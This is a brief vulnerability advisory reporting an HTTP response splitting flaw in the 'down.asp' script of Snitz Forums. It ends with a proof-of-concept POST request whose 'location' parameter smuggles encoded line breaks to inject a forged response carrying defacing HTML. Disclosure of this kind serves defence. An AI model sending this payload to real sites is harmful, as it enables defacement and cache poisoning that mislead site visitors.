Snitz Forums is reported prone to a HTTP response splitting vulnerability. The issue exists in a parameter of the 'down.asp' script. The issue presents itself due to a flaw in the affected script that allows an attacker to
manipulate how GET requests are handled.

A remote attacker may exploit this vulnerability to influence or misrepresent how web content is served, cached or interpreted.

POST /down.asp HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-length: 134

location=/foo?%0d%0a%0d%0aHTTP/1.0%20200%20OK%0d%0aContent-Length:%2014%0d%0aContent-Type:%20text/html%0d%0a%0d%0a{html}defaced{/html}
